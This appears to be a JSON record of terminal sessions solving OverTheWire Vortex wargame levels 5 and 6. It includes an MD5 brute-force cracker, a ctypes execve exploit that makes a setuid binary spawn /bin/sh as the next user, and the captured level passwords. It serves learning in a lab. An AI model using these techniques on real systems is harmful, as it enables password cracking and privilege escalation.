+      " 15         s = first + ''.join(t)",
+      " 16         if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 17             return s",
+      " 18     return None",
+      " 19",
+      " 20 if __name__ == '__main__':",
+      " 21     with mp.Pool(20) as pool:",
+      " 22         for r in pool.imap_unordered(worker, list(ALNUM)):",
+      " 23             if r:",
+      " 24                 print('FOUND:', r)",
+      " 25                 pool.terminate()",
+      " 26                 break",
+      " 27         else:",
+      " 28             print('not found')",
+      " 29",
+      "crack5.py [+]                                                                     29,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crack5.py",
+     "text": "vim crack5.py -- finished, before :wq",
+     "out": [
+      "  2",
+      "  3 TARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')",
+      "  4 ALNUM = string.ascii_letters + string.digits",
+      "  5",
+      "  6 def worker(first):",
+      "  7     # check short lengths for this first letter",
+      "  8     for L in range(1, 5):",
+      "  9         for t in itertools.product(ALNUM, repeat=L-1):",
+      " 10             s = first + ''.join(t)",
+      " 11             if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 12                 return s",
+      " 13     # the 5-char space: this first letter + 4 more",
+      " 14     for t in itertools.product(ALNUM, repeat=4):",
+      " 15         s = first + ''.join(t)",
+      " 16         if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 17             return s",
+      " 18     return None",
+      " 19",
+      " 20 if __name__ == '__main__':",
+      " 21     with mp.Pool(20) as pool:",
+      " 22         for r in pool.imap_unordered(worker, list(ALNUM)):",
+      " 23             if r:",
+      " 24                 print('FOUND:', r)",
+      " 25                 pool.terminate()",
+      " 26                 break",
+      " 27         else:",
+      " 28             print('not found')",
+      " 29",
+      "crack5.py [+]                                                                     29,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -l crack5.py",
+     "out": [
+      "29 crack5.py"
+     ]
+    },
+    {
+     "cmd": "cat -n crack5.py",
+     "out": [
+      "     1\timport hashlib, itertools, string, multiprocessing as mp",
+      "     2\t",
+      "     3\tTARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')",
+      "     4\tALNUM = string.ascii_letters + string.digits",
+      "     5\t",
+      "     6\tdef worker(first):",
+      "     7\t    # check short lengths for this first letter",
+      "     8\t    for L in range(1, 5):",
+      "     9\t        for t in itertools.product(ALNUM, repeat=L-1):",
+      "    10\t            s = first + ''.join(t)",
+      "    11\t            if hashlib.md5(s.encode()).digest() == TARGET:",
+      "    12\t                return s",
+      "    13\t    # the 5-char space: this first letter + 4 more",
+      "    14\t    for t in itertools.product(ALNUM, repeat=4):",
+      "    15\t        s = first + ''.join(t)",
+      "    16\t        if hashlib.md5(s.encode()).digest() == TARGET:",
+      "    17\t            return s",
+      "    18\t    return None",
+      "    19\t",
+      "    20\tif __name__ == '__main__':",
+      "    21\t    with mp.Pool(20) as pool:",
+      "    22\t        for r in pool.imap_unordered(worker, list(ALNUM)):",
+      "    23\t            if r:",
+      "    24\t                print('FOUND:', r)",
+      "    25\t                pool.terminate()",
+      "    26\t                break",
+      "    27\t        else:",
+      "    28\t            print('not found')",
+      "    29\t"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "mkdir -p /tmp/l5local && cd /tmp/l5local && rm -f crack5.py",
+     "out": []
+    },
+    {
+     "cmd": "cat > crack5.py <<'CRACKEOF'\nimport hashlib, itertools, string, multiprocessing as mp\n\nTARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')\nALNUM = string.ascii_letters + string.digits\n\ndef worker(first):\n    # check short lengths for this first letter\n    for L in range(1, 5):\n        for t in itertools.product(ALNUM, repeat=L-1):\n            s = first + ''.join(t)\n            if hashlib.md5(s.encode()).digest() == TARGET:\n                return s\n    # the 5-char space: this first letter + 4 more\n    for t in itertools.product(ALNUM, repeat=4):\n        s = first + ''.join(t)\n        if hashlib.md5(s.encode()).digest() == TARGET:\n            return s\n    return None\n\nif __name__ == '__main__':\n    with mp.Pool(20) as pool:\n        for r in pool.imap_unordered(worker, list(ALNUM)):\n            if r:\n                print('FOUND:', r)\n                pool.terminate()\n                break\n        else:\n            print('not found')\nCRACKEOF",
+     "out": []
+    },
+    {
+     "cmd": "wc -l crack5.py",
+     "out": [
+      "28 crack5.py"
+     ]
+    },
+    {
+     "cmd": "python3 crack5.py",
+     "out": [
+      "FOUND: rlTf6"
+     ]
+    },
+    {
+     "cmd": "echo -n rlTf6 | md5sum",
+     "out": [
+      "155fb95d04287b757c996d77b5ea51f7  -"
+     ]
+    },
+    {
+     "cmd": "ssh vortex5@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "/vortex/vortex5",
+     "out": [
+      "Password: ",
+      "6:36",
+      "You got the right password, congrats!"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5006(vortex6) gid=5005(vortex5) groups=5005(vortex5)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex6",
+     "out": [
+      "o5kBPzSFM"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex6@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5006(vortex6) gid=5006(vortex6) groups=5006(vortex6)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex6",
+     "out": [
+      "o5kBPzSFM"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 6,
+   "pw": "kZ90cmNy9",
+   "user": "vortex6",
+   "steps": [
+    {
+     "cmd": "ssh vortex6@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "mkdir -p /tmp/l6rec && cd /tmp/l6rec",
+     "out": []
+    },
+    {
+     "cmd": "nohup timeout 3 /vortex/vortex6 </dev/null >/tmp/l6rec/v6out 2>&1 & echo DETACHED",
+     "out": [
+      "[1] 34",
+      "DETACHED"
+     ]
+    },
+    {
+     "cmd": "sleep 4; wc -c /tmp/l6rec/v6out",
+     "out": [
+      "0 /tmp/l6rec/v6out"
+     ]
+    },
+    {
+     "cmd": "cp /vortex/vortex6 v6 && md5sum v6",
+     "out": [
+      "db0119220e93bde3024e6f5d1bf185f0  v6"
+     ]
+    },
+    {
+     "cmd": "objdump -d v6 | grep -A22 '<restart>:'",
+     "out": [
+      "080491a6 <restart>:",
+      " 80491a6:\t55                   \tpush   %ebp",
+      " 80491a7:\t89 e5                \tmov    %esp,%ebp",
+      " 80491a9:\t53                   \tpush   %ebx",
+      " 80491aa:\t83 ec 04             \tsub    $0x4,%esp",
+      " 80491ad:\te8 be fe ff ff       \tcall   8049070 <geteuid@plt>",
+      " 80491b2:\t89 c3                \tmov    %eax,%ebx",
+      " 80491b4:\te8 b7 fe ff ff       \tcall   8049070 <geteuid@plt>",
+      " 80491b9:\t83 ec 08             \tsub    $0x8,%esp",
+      " 80491bc:\t53                   \tpush   %ebx",
+      " 80491bd:\t50                   \tpush   %eax",
+      " 80491be:\te8 bd fe ff ff       \tcall   8049080 <setreuid@plt>",
+      " 80491c3:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80491c6:\t83 ec 04             \tsub    $0x4,%esp",
+      " 80491c9:\t6a 00                \tpush   $0x0",
+      " 80491cb:\tff 75 08             \tpush   0x8(%ebp)",
+      " 80491ce:\tff 75 08             \tpush   0x8(%ebp)",
+      " 80491d1:\te8 8a fe ff ff       \tcall   8049060 <execlp@plt>",
+      " 80491d6:\t83 c4 10             \tadd    $0x10,%esp",
+      " 80491d9:\t90                   \tnop",
+      " 80491da:\t8b 5d fc             \tmov    -0x4(%ebp),%ebx",
+      " 80491dd:\tc9                   \tleave",
+      " 80491de:\tc3                   \tret"
+     ]
+    },
+    {
+     "cmd": "objdump -d v6 | grep -A26 '<main>:'",
+     "out": [
+      "080491df <main>:",
+      " 80491df:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx",
+      " 80491e3:\t83 e4 f0             \tand    $0xfffffff0,%esp",
+      " 80491e6:\tff 71 fc             \tpush   -0x4(%ecx)",
+      " 80491e9:\t55                   \tpush   %ebp",
+      " 80491ea:\t89 e5                \tmov    %esp,%ebp",
+      " 80491ec:\t53                   \tpush   %ebx",
+      " 80491ed:\t51                   \tpush   %ecx",
+      " 80491ee:\t89 cb                \tmov    %ecx,%ebx",
+      " 80491f0:\t8b 43 08             \tmov    0x8(%ebx),%eax",
+      " 80491f3:\t8b 00                \tmov    (%eax),%eax",
+      " 80491f5:\t85 c0                \ttest   %eax,%eax",
+      " 80491f7:\t74 11                \tje     804920a <main+0x2b>",
+      " 80491f9:\t8b 43 04             \tmov    0x4(%ebx),%eax",
+      " 80491fc:\t8b 00                \tmov    (%eax),%eax",
+      " 80491fe:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 8049201:\t50                   \tpush   %eax",
+      " 8049202:\te8 9f ff ff ff       \tcall   80491a6 <restart>",
+      " 8049207:\t83 c4 10             \tadd    $0x10,%esp",
+      " 804920a:\t8b 43 08             \tmov    0x8(%ebx),%eax",
+      " 804920d:\t83 c0 0c             \tadd    $0xc,%eax",
+      " 8049210:\t8b 00                \tmov    (%eax),%eax",
+      " 8049212:\t83 ec 0c             \tsub    $0xc,%esp",
+      " 8049215:\t50                   \tpush   %eax",
+      " 8049216:\te8 25 fe ff ff       \tcall   8049040 <printf@plt>",
+      " 804921b:\t83 c4 10             \tadd    $0x10,%esp",
+      " 804921e:\t83 ec 0c             \tsub    $0xc,%esp"
+     ]
+    },
+    {
+     "cmd": "objdump -d v6 --section=.plt | head -26",
+     "out": [
+      "v6:     file format elf32-i386",
+      "",
+      "",
+      "Disassembly of section .plt:",
+      "",
+      "08049020 <__libc_start_main@plt-0x10>:",
+      " 8049020:\tff 35 f8 bf 04 08    \tpush   0x804bff8",
+      " 8049026:\tff 25 fc bf 04 08    \tjmp    *0x804bffc",
+      " 804902c:\t00 00                \tadd    %al,(%eax)",
+      "\t...",
+      "",
+      "08049030 <__libc_start_main@plt>:",
+      " 8049030:\tff 25 00 c0 04 08    \tjmp    *0x804c000",
+      " 8049036:\t68 00 00 00 00       \tpush   $0x0",
+      " 804903b:\te9 e0 ff ff ff       \tjmp    8049020 <_init+0x20>",
+      "",
+      "08049040 <printf@plt>:",
+      " 8049040:\tff 25 04 c0 04 08    \tjmp    *0x804c004",
+      " 8049046:\t68 08 00 00 00       \tpush   $0x8",
+      " 804904b:\te9 d0 ff ff ff       \tjmp    8049020 <_init+0x20>",
+      "",
+      "08049050 <_exit@plt>:",
+      " 8049050:\tff 25 08 c0 04 08    \tjmp    *0x804c008",
+      " 8049056:\t68 10 00 00 00       \tpush   $0x10",
+      " 804905b:\te9 c0 ff ff ff       \tjmp    8049020 <_init+0x20>"
+     ]
+    },
+    {
+     "cmd": "readelf -l /vortex/vortex6 2>/dev/null | grep -E 'GNU_STACK|RELRO' -A1 || readelf -l v6 | grep -E 'GNU_STACK|RELRO' -A1",
+     "out": [
+      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10",
+      "  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1"
+     ]
+    },
+    {
+     "cmd": "stat -c %s /etc/vortex_pass/vortex7",
+     "out": [
+      "10"
+     ]
+    },
+    {
+     "cmd": "vim ex.py",
+     "text": "vim ex.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex.py                                                                             0,0-1          All",
+      "\"ex.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim ex.py",
+     "text": "vim ex.py -- insert chunk 1",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 prog = sys.argv[1].encode()",
+      "  3 # argv[0] is what restart() re-execs: point it at /bin/sh so the setuid",
+      "  4 # binary drops us into a shell as vortex7",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex.py [+]                                                                         4,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex.py",
+     "text": "vim ex.py -- insert chunk 2",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 prog = sys.argv[1].encode()",
+      "  3 # argv[0] is what restart() re-execs: point it at /bin/sh so the setuid",
+      "  4 # binary drops us into a shell as vortex7",
+      "  5 argv = [b\"/bin/sh\"] + [None]",
+      "  6 env = [b\"PATH=/bin:/usr/bin\", b\"TERM=xterm\"] + [None]",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex.py [+]                                                                         6,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex.py",
+     "text": "vim ex.py -- insert chunk 3",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 prog = sys.argv[1].encode()",
+      "  3 # argv[0] is what restart() re-execs: point it at /bin/sh so the setuid",
+      "  4 # binary drops us into a shell as vortex7",
+      "  5 argv = [b\"/bin/sh\"] + [None]",
+      "  6 env = [b\"PATH=/bin:/usr/bin\", b\"TERM=xterm\"] + [None]",
+      "  7 libc = ctypes.CDLL(\"libc.so.6\")",
+      "  8 ARGV = (ctypes.c_char_p * len(argv))(*argv)",
+      "  9 ENVP = (ctypes.c_char_p * len(env))(*env)",
+      " 10 libc.execve(prog, ARGV, ENVP)",
+      " 11 print(\"execve failed\", ctypes.get_errno())",
+      " 12",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex.py [+]                                                                         12,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex.py",
+     "text": "vim ex.py -- finished, before :wq",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 prog = sys.argv[1].encode()",
+      "  3 # argv[0] is what restart() re-execs: point it at /bin/sh so the setuid",
+      "  4 # binary drops us into a shell as vortex7",
+      "  5 argv = [b\"/bin/sh\"] + [None]",
+      "  6 env = [b\"PATH=/bin:/usr/bin\", b\"TERM=xterm\"] + [None]",
+      "  7 libc = ctypes.CDLL(\"libc.so.6\")",
+      "  8 ARGV = (ctypes.c_char_p * len(argv))(*argv)",
+      "  9 ENVP = (ctypes.c_char_p * len(env))(*env)",
+      " 10 libc.execve(prog, ARGV, ENVP)",
+      " 11 print(\"execve failed\", ctypes.get_errno())",
+      " 12",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex.py [+]                                                                         12,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -l ex.py",
+     "out": [
+      "12 ex.py"
+     ]
+    },
+    {
+     "cmd": "cat -n ex.py",
+     "out": [
+      "     1\timport ctypes, sys, os",
+      "     2\tprog = sys.argv[1].encode()",
+      "     3\t# argv[0] is what restart() re-execs: point it at /bin/sh so the setuid",
+      "     4\t# binary drops us into a shell as vortex7",
+      "     5\targv = [b\"/bin/sh\"] + [None]",
+      "     6\tenv = [b\"PATH=/bin:/usr/bin\", b\"TERM=xterm\"] + [None]",
+      "     7\tlibc = ctypes.CDLL(\"libc.so.6\")",
+      "     8\tARGV = (ctypes.c_char_p * len(argv))(*argv)",
+      "     9\tENVP = (ctypes.c_char_p * len(env))(*env)",
+      "    10\tlibc.execve(prog, ARGV, ENVP)",
+      "    11\tprint(\"execve failed\", ctypes.get_errno())",
+      "    12\t"
+     ]
+    },
+    {
+     "cmd": "echo \"id; cat /etc/vortex_pass/vortex7; exit\" | python3 ex.py /vortex/vortex6 '[\"/bin/sh\"]'",
+     "out": [
+      "uid=5007(vortex7) gid=5006(vortex6) groups=5006(vortex6)",
+      "kZ90cmNy9"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex7@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5007(vortex7) gid=5007(vortex7) groups=5007(vortex7)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex7",
+     "out": [
+      "kZ90cmNy9"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
     }
    ]
   }
